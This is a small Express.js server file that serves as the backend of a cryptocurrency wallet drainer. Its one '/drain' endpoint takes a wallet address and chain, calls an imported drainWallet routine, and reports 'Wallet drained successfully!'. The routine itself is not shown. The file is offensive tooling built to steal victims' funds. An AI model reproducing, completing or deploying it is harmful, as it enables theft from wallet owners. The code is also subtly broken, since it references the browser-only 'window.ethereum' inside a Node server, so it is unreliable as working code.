const express = require('express');
const app = express();
const port = 3000;
const { drainWallet } = require('./routes/drain');

app.use(express.json());

app.post('/drain', async (req, res) => {
  const { walletAddress, chain } = req.body;

  if (!walletAddress || !chain) {
    return res.status(400).send({ error: 'Missing wallet address or chain' });
  }

  try {
    const web3 = new require('web3')(window.ethereum);
    await drainWallet(walletAddress, chain);
    res.send({ message: 'Wallet drained successfully!' });
  } catch (err) {
    console.error(err);
    res.status(500).send({ error: 'Drain failed' });
  }
});

app.listen(port, () => {
  console.log(`Backend running at http://localhost:${port}`);
});